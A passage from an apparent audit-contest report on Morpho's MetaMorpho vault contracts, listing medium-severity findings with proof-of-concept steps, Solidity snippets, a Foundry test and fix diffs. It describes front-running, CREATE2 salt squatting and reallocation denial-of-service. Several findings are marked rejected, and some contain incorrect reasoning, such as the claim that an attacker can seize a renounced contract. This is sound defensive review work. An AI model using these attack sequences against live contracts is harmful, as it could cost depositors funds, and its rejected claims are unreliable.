                uint256 suppliedAssets = allocation.assets == type(uint256).max
                    ? totalWithdrawn.zeroFloorSub(totalSupplied)
                    : allocation.assets.zeroFloorSub(supplyAssets);

                if (suppliedAssets == 0) continue;

                uint256 supplyCap = config[id].cap;
                if (supplyCap == 0) revert ErrorsLib.UnauthorizedMarket(id);

                if (supplyAssets + suppliedAssets > supplyCap) revert ErrorsLib.SupplyCapExceeded(id);

                // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.
                (, uint256 suppliedShares) =
                    MORPHO.supply(allocation.marketParams, suppliedAssets, 0, address(this), hex"");

                emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares);

                totalSupplied += suppliedAssets;
            }
        }

445:    if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
    }

```

**Proof of Concept:**

Consider the following scenario:

1. The Allocator initiates a call to the `reallocate` function, including markets with existing allocations that need to be completely withdrawn (where allocation.assets = 0).

2. Due to the condition on Line 412, the `MORPHO.withdraw` call utilizes `shares` instead of `assets`.

3. `MORPHO`'s conversion from `shares` to `assets` rounds down, potentially causing the `withdrawnAssets` on Line 417 to be slightly lower than expected.

4. If multiple markets with new `allocation.assets = 0` are involved, the precision loss in `totalWithdrawn` (Line 422) accumulates.

5. Consequently, the condition on Line 445 may be off by a few wei, resulting in DoS.

In such cases, it will be impossible to use `allocation.assets = 0` and make `reallocate` call to pass through.  That's why it's important to mitigate this issue.

- Recommendation

To address this precision-related issue, it is recommended to introduce a variable, `MaxAllowedError`, representing the maximum precision error that the reallocation can accommodate. If the error exceeds this threshold, the function should revert to prevent inaccurate calculations.

```diff

-445:    if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
+        if (totalWithdrawn > totalSupplied) {
+             if(totalWithdrawn - totalSupplied > MaxAllowedError){
+                 revert ErrorsLib.InconsistentReallocation();
+             }
+         } else if (totalWithdrawn < totalSupplied) {
+             if(totalSupplied - totalWithdrawn > MaxAllowedError){
+                 revert ErrorsLib.InconsistentReallocation();
+             }
+         }

```




### MetaMorpho does not work with fee-on-transfer token markets	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L559-L569](metamorpho/src/MetaMorpho.sol#L559-L569), [MetaMorpho.sol#L797-L820](metamorpho/src/MetaMorpho.sol#L797-L820)

- Description

In the current scenario, MetaMorpho can provide assets and shares to Morpho Blue through the deposit() and mint() functions. However, both functions follow a process where the specified amount is initially transferred to MetaMorpho and then from MetaMorpho to Morpho Blue. This implementation is not compatible with fee-on-transfer tokens. In the case of a token used by MetaMorpho and all associated markets, the transfer would be less than the specified amount in the parameter. This discrepancy could lead to the Morpho Blue contract reverting due to an insufficient amount in MetaMorpho.

- Proof of Concept

Prerequisites:

- MetaMorpho with a fee-on-transfer token.

1. Initiate the `deposit()` function in MetaMorpho with a transfer of 1000 tokens.
2. MetaMorpho will calculate the corresponding shares and transfer the full 1000 tokens.
3. Due to the fee-on-transfer mechanism, less than 1000 tokens will remain in MetaMorpho after the transaction.
4. Execute the `_supplyMorpho()` function with a parameter of 1000.
5. An attempt will be made to transfer 1000 tokens from MetaMorpho to Morpho Blue, but this operation will fail as there are insufficient tokens available.
6. As a result, the `_supplyMorpho()` function will revert with an `AllCapsReached()` exception.

The reversion occurs because the `_supplyMorpho()` function utilizes a try/catch block to handle external calls. However, as each market deposit fails, the assets remain at 1000 in the end, leading to the reversion due to insufficient tokens.

```solidity
function _supplyMorpho(uint256 assets) internal {
    for (uint256 i; i < supplyQueue.length; ++i) {
        Id id = supplyQueue[i];

        uint256 supplyCap = config[id].cap;
        if (supplyCap == 0) continue;

        MarketParams memory marketParams = _marketParams(id);
        (uint256 supplyAssets,,) = _accruedSupplyBalance(marketParams, id);

        uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);

        if (toSupply > 0) {
            // Using try/catch to skip markets that revert.
            try MORPHO.supply(marketParams, toSupply, 0, address(this), hex"") {
                assets -= toSupply;
            } catch {}
        }

        if (assets == 0) return;
    }

    if (assets != 0) revert ErrorsLib.AllCapsReached();
}
```

- Recommendation

Capture the balance both before and after to confirm the actual amount of tokens that will be transferred.

```solidity
function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
+   uint256 balanceOfBefore = totalAssets();
    super._deposit(caller, receiver, assets, shares);
+   uint256 balanceOfAfter = totalAssets();

-		_supplyMorpho(assets);
+   _supplyMorpho(balanceOfAfter - balanceOfBefore);

    // `lastTotalAssets + assets` may be a little off from `totalAssets()`.
    _updateLastTotalAssets(lastTotalAssets + assets);
}
```



### Users can DoS the `deposit` functionality for some time, by front-running the `submitCap()` function without any cast at all	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L286-L304](metamorpho/src/MetaMorpho.sol#L286-L304), [MetaMorpho.sol#L559-L569](metamorpho/src/MetaMorpho.sol#L559-L569)

- Description

The [`submitCap()`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L286-L304) is a governance function that allows `Curator` to adjust the supply cap of a `Morpho Market`, either `immediately decreasing` it or setting a new higher cap to take effect after a timelock period.
The problem arises when the `newSupplyCap` is lower than the current `supplyCap`, the function immediately sets the new cap using `_setCap(id, newSupplyCap.toUint184())`.

Users can potentially execute a DoS (Denial of Service) attack on the deposit functionality within the protocol. By front-running the [`submitCap()`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L286-L304) transaction initiated by the `Curator`, malicious users can manipulate the supply cap for [`MetaMorpho.sol`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol) contract, causing a disruption in the deposit process. This can lead to an imbalance in asset deposits and create a denial of service situation for legitimate users for some period of time. This front-running attack can be executed without any cost at all, because at any time malicious users who front-run the [`submitCap()`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L286-L304) function to disrupt (DoS) the deposit functionality of [`MetaMorpho.sol`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol) will be able to withdraw their deposited assets. This means that they can DoS (interrupt) the deposit functionality at any time they want, without incurring any costs at all. This also will cause confusion in the overall flow of `MetaMorpho.sol` and these malicious users will effectively manipulate the supply cap for `MetaMorpho.sol` contract, causing it to be lower than the actual amount supplied in `MetaMorpho.sol`.

- Proof of Concept

The vulnerability revolves around the interaction between users and the [`submitCap()`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L286-L304) function, which allows the `Curator` to adjust the deposit limits for specific assets. The process unfolds as follows:

1. The current supply cap for a particular `Morpho Market` is set to 1000.
2. Users supply a total of 200 for this particular `Morpho Market`.
3. The `Curator` initiates a transaction to update the Morpho market supply cap to 500 using the [`submitCap()`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L286-L304) function. Because the `newSupplyCap` is lower than the current `supplyCap`, the function immediately sets the new cap using `_setCap(id, newSupplyCap.toUint184())`.
4. A malicious user identifies this transaction and front-runs it by supplying 500 for this `Morpho Market` via the [`deposit()`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L559-L569) function.
5. The malicious user's transaction executes first, resulting in a total supply amount of 700 for this asset.
6. Subsequently, the `Curator` transaction executes, setting the supply cap for this `Morpho Market` to 500.

- [`submitCap()`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L286-L304) function

```solidity
function submitCap(MarketParams memory marketParams, uint256 newSupplyCap) external onlyCuratorRole {
    Id id = marketParams.id();
    if (marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);
    if (MORPHO.lastUpdate(id) == 0) revert ErrorsLib.MarketNotCreated();

    uint256 supplyCap = config[id].cap;
    if (newSupplyCap == supplyCap) revert ErrorsLib.AlreadySet();

    if (newSupplyCap < supplyCap) {
        _setCap(id, newSupplyCap.toUint184());
    } else {
        // newSupplyCap > supplyCap >= 0 so there's no need to check `pendingCap[id].validAt != 0`.
        if (newSupplyCap == pendingCap[id].value) revert ErrorsLib.AlreadyPending();

        pendingCap[id].update(newSupplyCap.toUint184(), timelock);

        emit EventsLib.SubmitCap(_msgSender(), id, newSupplyCap);
    }
}
```

- [`deposit()`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L559-L569) function

```solidity
function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {
    uint256 newTotalAssets = _accrueFee();

    // Update `lastTotalAssets` to avoid an inconsistent state in a re-entrant context.
    // It is updated again in `_deposit`.
    lastTotalAssets = newTotalAssets;

    shares = _convertToSharesWithTotals(assets, totalSupply(), newTotalAssets, Math.Rounding.Floor);

    _deposit(_msgSender(), receiver, assets, shares);
}
```

As a result, the malicious user has effectively manipulated the `supply cap` for particular `Morpho Market`, causing it to be lower than the actual supplied amount. This can prevent legitimate users from supplying additional assets, effectively disrupting the deposit functionality for this particular `Morpho Market`, because of undeflow of the calculation for `toSupply` in [`_supplyMorpho()`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L797-L820) function.

```solidity
uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);
```

- Recommendation

I recommend implementing a check at the beginning of the [`submitCap()`](https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L286-L304) function to ensure that the actual supplied assets are lower than the new `newSupplyCap`.

```diff
function submitCap(MarketParams memory marketParams, uint256 newSupplyCap) external onlyCuratorRole {
    Id id = marketParams.id();
    if (marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);
    if (MORPHO.lastUpdate(id) == 0) revert ErrorsLib.MarketNotCreated();

    uint256 supplyCap = config[id].cap;
    if (newSupplyCap == supplyCap) revert ErrorsLib.AlreadySet();

+   (uint256 supplyAssets,,) = _accruedSupplyBalance(marketParams, id);
+   if (supplyCap < supplyAssets) revert();

    if (newSupplyCap < supplyCap) {
        _setCap(id, newSupplyCap.toUint184());
    } else {
        // newSupplyCap > supplyCap >= 0 so there's no need to check `pendingCap[id].validAt != 0`.
        if (newSupplyCap == pendingCap[id].value) revert ErrorsLib.AlreadyPending();

        pendingCap[id].update(newSupplyCap.toUint184(), timelock);

        emit EventsLib.SubmitCap(_msgSender(), id, newSupplyCap);
    }
}
```



### Loss of Fee Income Due to Incomplete Interest Accrual after updateWithdrawQueue	_(duplicate of [Metamorpho receives less fees when removes market with non-zero supply])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Impact

The vulnerability poses a significant risk as, after the forced removal of markets with positive supplies, the `_updateLastTotalAssets` function is not called. This omission results in improper interest accrual for subsequent activities and a failure to mint fees to the feeRecipient, leading to a loss of funds in the vault's fee income.

- Proof of Concept

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L370

The root cause of the vulnerability is that, after the forced removal of markets with positive supplies, the `_updateLastTotalAssets` function is not invoked. This oversight leads to an incomplete interest accrual process and the absence of fee minting for the feeRecipient.

1. **Scenario:**
   - Forced removal of a market with positive supplies occurs and do not trigger the `_updateLastTotalAssets` function.
   - Subsequent activities that require interest accrual occurs. The feeRecipient does not receive the expected fees due to lower value of `newTotalAssets` after forced market removal, resulting in a loss of funds for the vault's fee income.
  
```solitidy
    function _accrueFee() internal returns (uint256 newTotalAssets) {
        (feeShares, newTotalAssets) = _accruedFeeShares(); // @audit-info zero feeShares minted for feeRecipient

        if (feeShares != 0) _mint(feeRecipient, feeShares);
    }

    function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {
        newTotalAssets = totalAssets();

        uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets); // @audit-info totalInterest = 0 due to lower newTotalAssets after forced market removal
...
    }
```

- Tools Used

Manual Review

- Recommended Mitigation Steps

To address this issue, it is recommended to implement a call to `_updateLastTotalAssets` in the case of forced market removal, ensuring that subsequent activities accrue interest properly and fees are minted to the feeRecipient.




### Incorrect Interest Calculation and Inflated FeeShares Due to Missing _updateLastTotalAssets in reallocate	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Impact

The vulnerability introduces a severe risk, leading to incorrect interest calculations. The issue arises when assets are withdrawn from outside markets (not managed by the vault) to this vault. If the withdrawal occurs without calling `_updateLastTotalAssets(increasedSupplied)`, the subsequent `_accrueFee` function may arbitrarily mint extra interest shares to the feeRecipient. This can result in an inflated feeShares for the feeRecipient and a loss of funds for users, as fees are not properly calculated.

- Proof of Concept

The root cause of the vulnerability is that the `_updateLastTotalAssets` function is not consistently called when assets are withdrawn from external markets. This omission leads to a discrepancy in interest calculations, potentially minting extra interest shares during fee accrual.

1. **Scenario:**
   - Assets are withdrawn from an external market to the vault.
   - The `_updateLastTotalAssets` function is not invoked after the withdrawal.
   - Subsequent calls to `_accrueFee` may arbitrarily mint extra interest shares to the feeRecipient.

- Tools Used

Manual Review

- Recommended Mitigation Steps

To address this issue, it is recommended to ensure that the `_updateLastTotalAssets` function is consistently called whenever assets are withdrawn from external markets to the vault. This will prevent incorrect interest calculations and mitigate the risk of inflated feeShares.




### Tokens like UNI can revert on large amount transfers/approvals	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Links
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L133

- Summary 
Assets like UNI are programmed to revert transactions that involve large approvals and transfers.

- Vulnerability Details

According to the [documentation](https://github.com/d-xo/weird-erc20). UNI reverts if the value passed to approve or transfer is larger than uint96. When constructing the Vault, a large approval is made :


```javascript
    constructor(
        address owner,
        address morpho,
        uint256 initialTimelock,
        address _asset,
        string memory _name,
        string memory _symbol
    ) ERC4626(IERC20(_asset)) ERC20Permit(_name) ERC20(_name, _symbol) Ownable(owner) {
        if (morpho == address(0)) revert ErrorsLib.ZeroAddress();

        MORPHO = IMorpho(morpho);

        _checkTimelockBounds(initialTimelock);
        _setTimelock(initialTimelock);

@>        IERC20(_asset).forceApprove(morpho, type(uint256).max);
    }
```

- Impact
At the very least disrupting the contract creation or worse blocking the vault when large transfers happen.

- Recommendations
- Limit or Check the amount of approved tokens
- Check the amounts being transfered



### Using CREATE2 with a user-specified `salt` makes `createMetaMorpho()` susceptible to front-running	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Context:**

- [MetaMorphoFactory.sol#L36-L58](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L36-L58)
- [MetaMorpho.sol#L559-L569](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559-L569)

**Description:**

`MetaMorphoFactory` uses `create2` to deploy `MetaMorpho` vaults, using a `salt`:

```solidity
metaMorpho = new MetaMorpho{salt: salt}(initialOwner, MORPHO, initialTimelock, asset, name, symbol);
```

However, since `salt` is specified by the caller and does not include `msg.sender`, different addresses will be able to deploy vaults to the same address.

This introduces risks if users pre-compute the address of their deployed vault, which is possible since it uses `create2`. For example:

- Bob wants to deploy a vault and deposit some funds into it.
- To save gas, he batches the following transactions together:
  - Call `createMetaMorpho()` to deploy a new vault, with herself as `initialOwner`.
  - Pre-compute the address of his deployed vault.
  - Set up the new vault with some markets.
  - Call `deposit()` to deposit funds into his vault.
- Alice sees his batched transaction in the mempool and front-runs it:
  - She calls `createMetaMorpho()` with the same salt as Bob, but with herself as `initialOwner`. This will still deploy the vault at the address Bob pre-computed.
  - Set up the vault with her own markets and malicious configurations.
- Now, Bob's transaction is executed, which deposits funds into Alice's market instead.
- Depending on how Alice set up the vault, she can steal Bob's funds.

The same exploit could also occur in a chain re-org scenario:
- Assume the following transactions occur:
  - Transaction 1: Bob calls `createMetaMorpho()` to deploy a vault.
  - Transaction 2: Bob calls `deposit()` to deposit funds into the vault.
- A chain re-org occurs until before transaction 1 was executed.
- Alice front-runs transaction 1 and calls `createMetaMorpho()` with the same salt.

This has the same result as the first scenario.

**Recommendation:**

Consider including `msg.sender` in the salt used to deploy `MetaMorpho` vaults. For example:

```diff
- metaMorpho = new MetaMorpho{salt: salt}(initialOwner, MORPHO, initialTimelock, asset, name, symbol);
+ metaMorpho = new MetaMorpho{salt: keccak256(abi.encodePacked(salt, msg.sender))}(initialOwner, MORPHO, initialTimelock, asset, name, symbol);
```

This ensures different addresses will not be able to deploy vaults to the same address.



### Ownership transfer in MetaMorpho vaults are not timelocked	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Context:**

- [MetaMorpho.sol#L260-L279](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L260-L279)
- [MetaMorpho.sol#L156-L161](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L156-L161)

**Description:**

MetaMorpho's [README](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8#readme) states that all permissioned actions that might harm users in a vault is under a timelock:

> All actions that may be against users' interests (e.g. enabling a market with a high exposure, increasing the fee) are subject to a timelock of minimum 12 hours. If set, the `guardian` can revoke the action during the timelock except for the fee increase. After the timelock, the action can be executed by anyone.

This includes `submitGuardian()`, which is used by the owner to change the `guardian` role address:

```solidity
if (pendingGuardian.validAt != 0 && newGuardian == pendingGuardian.value) {
    revert ErrorsLib.AlreadyPending();
}

pendingGuardian.update(newGuardian, timelock);
```

However, transferring ownership of the vault using `transferOwnership()` in `Ownable2Step.sol` is not under a timelock. As such, a vault's owner can be changed before users who are deposited in the vault can react.

A vault's owner has the ability to do anything the `guardian` can do:

```solidity
modifier onlyGuardianRole() {
    if (_msgSender() != owner() && _msgSender() != guardian) revert ErrorsLib.NotGuardianRole();

    _;
}
```

As such, this defeats the entire purpose of having the `guardian` role under a timelock. 

**Recommendation:**

Consider overriding `transferOwnership()` to implement timelock functionality to ownership transfers.

Alternatively, remove the timelock from `submitGuardian()`.



### reallocations that results in sudden profit from markets that are in the withdraw queue can be front-runed	_(duplicate of [Suppliers can frontrun forced market removal and losses])_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L397-L397](metamorpho/src/MetaMorpho.sol#L397-L397)

code allows withdrawing from markets that are not in the withdraw queue, This will result in sudden asset/share increase and users who front-run the reallocate and deposits will benefit from it. those users will withdraw after reallocation.

when admins wants to remove a market from withdraw queue (so metamorpho's balance in that market will be ignored) which result in sudden loss for metamorpho depositors, the change have to go through a timelock mechanism, which would give everyone time windows to act accordingly.


but when the reverse happens, there is no time delay, this will incentives the front-runers and later depositors which are going to withdraw their funds after the sudden profit. this will cause loss(less profit) to old depositors.

there should be a similar delay mechanism when a sudden profit is gonna happen, everybody have time to react.




### Chainlink oracle data feed isn't sufficiently validated and could return stale data leading to loss of funds of the users.	_(duplicate of [Don't check chainlink's latestRoundData return stale or incorrect result])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Relevant Links
https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L116-L120

- Summary
Incorrect Chainlink Price Oracle Implementation

- Vulnerability Details
The Morho Blue protocol relies on a Chainlink price oracle to get the price of an asset from a price source, with Chainlink Aggregator smart contracts as primary option.

In [`ChainlinkDataFeedLib::getPrice`](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L20C1-L27C6) the price feed are obtained using Chainlink oracle like this: 
```js
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

@>      (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }
```

There are three major components to check while getting `lastestAnswer()` Chainlink Oracle Implementation:

1. Chainlink aggregators have a built in circuit breaker if the price of an asset goes outside of a predetermined price band. The result is that if an asset experiences a huge drop in value (i.e. LUNA crash [1]) the price of the oracle will continue to return the minPrice instead of the actual price of the asset. This would allow user to continue borrowing with the asset but at the wrong price. 

According to Chainlink's [documentation](https://docs.chain.link/data-feeds/historical-data), it is important to provide additional checks that the data is fresh:

2. If answeredInRound is less than roundId, the answer is being carried over.
3. A timestamp with zero value means the round is not complete and should not be used.

The current implementation doesn't sanitize the data coming from the Chainlink Oracle following above three security issues.

[1] Reference Hack that was took place due to this issue: 
https://rekt.news/venus-blizz-rekt/



### Curator can submit zero as new supplyCap and bypass marketRemoval flow	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Description
When calling the submitCap function at the MetaMorpho contract, there are no sanity checks that stop a curator from setting newSupplyCap to zero.
```solidity
function submitCap(MarketParams memory marketParams, uint256 newSupplyCap) external onlyCuratorRole {

        Id id = marketParams.id();
        if (marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);
        if (MORPHO.lastUpdate(id) == 0) revert ErrorsLib.MarketNotCreated();

        uint256 supplyCap = config[id].cap;
        if (newSupplyCap == supplyCap) revert ErrorsLib.AlreadySet();

        if (newSupplyCap < supplyCap) {
            _setCap(id, newSupplyCap.toUint184());
        } else {
            // newSupplyCap > supplyCap >= 0 so there's no need to check `pendingCap[id].validAt != 0`.
            if (newSupplyCap == pendingCap[id].value) revert ErrorsLib.AlreadyPending();
        pendingCap[id].update(newSupplyCap.toUint184(), timelock);
            emit EventsLib.SubmitCap(_msgSender(), id, newSupplyCap);

        }
    }
```

This creates two problems:
1. Setting the cap to zero right away is analogous to submiting a market removal without having to go through the timelock.
2. A malicious curator can set a cap to zero to induce certain users to utilize markets that are at the end of the supplyQueue and may not be as desired as the other ones.
- Proof of concept
Paste the following code snippet to test/forge/MarketTest2.sol:
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later

pragma solidity ^0.8.0;

import {stdError} from "../../lib/forge-std/src/StdError.sol";
import {SafeCast} from "../../lib/openzeppelin-contracts/contracts/utils/math/SafeCast.sol";
import "./helpers/IntegrationTest.sol";
import "../../src/interfaces/IMorphoMarketParams.sol";
import {console} from "../../lib/forge-std/src/console.sol";

contract MarketTest2 is IntegrationTest {

    using MarketParamsLib for MarketParams;
    using MorphoLib for IMorpho;

    address private ALICE;
    address private BOB;

    function setUp() public override {
        super.setUp();
        // Assign addresses for Alice and Bob
        ALICE = address(1);
        BOB = address(2);

        // Set up initial balances for Alice and Bob
        loanToken.setBalance(ALICE, 1 ether);
        loanToken.setBalance(BOB, 1 ether);

        // Set caps for markets as needed
        _setCap(allMarkets[0], CAP);
        _setCap(allMarkets[1], CAP);
        _setCap(allMarkets[2], CAP);

    }
  
    function testSubmitZeroCap() public {
        console.log("Initial cap:", vault.config(allMarkets[0].id()).cap);
        vm.prank(CURATOR);
        vault.submitCap(allMarkets[0], 0);
        console.log("Final cap", vault.config(allMarkets[0].id()).cap);
    }
}
```

Run the test with the following command:
```
forge test --match-contract MarketTest2 -vvv
```

- Recommendation
Do not allow 0 as a valid newSupplyCap value, as this is a part of a different flow for a market - it's removal.



### [M] Attacker can make a deployed UniversalRewardsDistributor fail	_(duplicate of [Using CREATE2 with a user-specified `salt` makes `createMetaMorpho()` susceptible to front-running])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
The createUrd function in the UrdFactory contract is designed to create a new instance of the 
UniversalRewardsDistributor (URD) contract using the CREATE2 opcode.


CREATE2 allows for deterministic contract address generation, where the address depends on the sender's address, 
the salt, and the contract's initialization code.
The salt is a value used in the CREATE2 opcode to ensure uniqueness of the contract's address. 
If the same user deploys a contract with the same bytecode and salt multiple times, the address will always be 
the same.
The salt could be any arbitrary bytes32 value. It's often used to ensure the determinism of the contract 
address or to generate multiple unique instances of a contract.

Below you can see that the salt is used in the CREATE2 opcode to generate the address of the contract.

```
  function createUrd(
        address initialOwner,
        uint256 initialTimelock,
        bytes32 initialRoot,
        bytes32 initialIpfsHash,
        bytes32 salt
    ) public returns (UniversalRewardsDistributor urd) {
        urd = new UniversalRewardsDistributor{salt: salt}(
            initialOwner,
            initialTimelock,
            initialRoot,
            initialIpfsHash
        );

        isUrd[address(urd)] = true;

        emit EventsLib.UrdCreated(
            address(urd), msg.sender, initialOwner, initialTimelock, initialRoot, initialIpfsHash, salt
        );
    }
```

Proof of attack:

An issue could be that an attacker can frontrun the creation with their own creation request, 
with the same parameters. This would create the exact address created by the CREATE2 call, 
since the parameters and therefore the final salt will be the same. When the victim's transaction 
would be executed, the address is non-empty so the EVM would reject its creation. 
This would result in a bad experience for a user, who thinks the creation did not succeed. 
The resulting contract would still be usable, but would be hard to track as it was created in another TX.


**Recommendation**:

Use an ever-increasing nonce counter to guarantee unique contract addresses.



### [M] Attacker can DOS creation of metaMorpho vaults by frontrunning the salt value	_(duplicate of [Using CREATE2 with a user-specified `salt` makes `createMetaMorpho()` susceptible to front-running])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
The MetaMorphoFactory is designed to allow users to create new MetaMorpho vaults.
According to the dev comment,

 **"    /// @param salt The salt to use for the MetaMorpho vault's CREATE2 address."**

It utilizes the CREATE2 opcode, which enables deterministic contract address generation based 
on several parameters, including a user-provided salt. 
This functionality is crucial for predictable and efficient contract deployments.

Users provide a salt value, which is used in the CREATE2 opcode to generate the address of the contract.

```
  function createVault(
        address initialOwner,
        uint256 initialTimelock,
        bytes32 initialRoot,
        bytes32 initialIpfsHash,
        bytes32 salt
    ) public returns (MetaMorpho vault) {
        vault = new MetaMorpho{salt: salt}(
            initialOwner,
            initialTimelock,
            initialRoot,
            initialIpfsHash
        );

        isVault[address(vault)] = true;

        emit EventsLib.VaultCreated(
            address(vault), msg.sender, initialOwner, initialTimelock, initialRoot, initialIpfsHash, salt
        );
    }
```

**POC:** 

The vulnerability arises from the predictable nature of contract address generation using CREATE2. 
An attacker can observe the parameters of a pending createVault transaction, including the salt, 
and deploy their own MetaMorpho vault using the same salt. 

This would lead to the attacker's contract being deployed at the address intended for the original vault, causing the legitimate user's transaction to fail when it is processed, causing the DOS. This is detailed in the EIP below:

https://eips.ethereum.org/EIPS/eip-1014



**Recommendation**

I would recommend to user an incrementing nonce to guarantee unique contract addresses.



### [M] Attacker can bypass ownership transfer and set himself as the owner	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
https://github.com/morpho-org/metamorpho/blob/a4a6c3dda06379dc3e02fbb053f6761f1e90ea1c/src/MetaMorpho.sol#L43

In MetaMorpho, it inherits from the Ownable2Step contract, thus also inheriting
Ownable. 

Ownable has a function called transferOwnership, which allows the current owner to transfer ownership to another address.

Also, Ownable has the ability to allow the owner to renounceOwnership.

```
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

```

Which will call 

```
   function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
```

However, this sets the new owner to address(0), which is the zero address.

This means that the contract is now ownerless.

Now, an attacker can call the transferOwnership function and set himself as the owner.

    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

Considering initially this has a modifier assigned to the owner, this will now not be relevant as the contract is ownerless.
Leaving anyone open to setting themselves as the owner.




**Recommendation**:

One common solution is to use multi-signature ownership. Instead of having a single owner, 
you can require a certain number of approved addresses (e.g., a multisig wallet) to collectively confirm 
ownership changes. 
This approach adds an extra layer of security by requiring multiple parties to agree on changes.




### Potential DoS in function `MetaMorpho::reallocate` due to Front-Run	_(duplicate of [Reallocation of funds can revert because of rounding ])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Relevant GitHub Links

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L397
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L445

- Summary

The `reallocate` function is susceptible to a Denial of Service attack. This vulnerability arises from potential front-running attacks combined with the function's inherent sensitivity to rounding errors and asset balance manipulation.

- Vulnerability Details

- Attack Vector: Front-Running and Rounding Errors

The function concludes its operation by verifying the equality of `totalWithdrawn` and `totalSupplied`. 
```javascript
if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
```
An attacker can exploit this by conducting a front-running transaction that slightly alters the market state, causing a discrepancy due to rounding errors in subsequent `MORPHO.withdraw` and `MORPHO.supply` operations.

- Proof of Concept (PoC)

1. The attacker spots a pending transaction calling `reallocate`.
2. They front-runs it by executing a transaction altering the market's state (like a minor supply or withdrawal) in the `MORPHO` contract.
3. `totalWithdrawn` and `totalSupplied` diverge due to rounding errors.
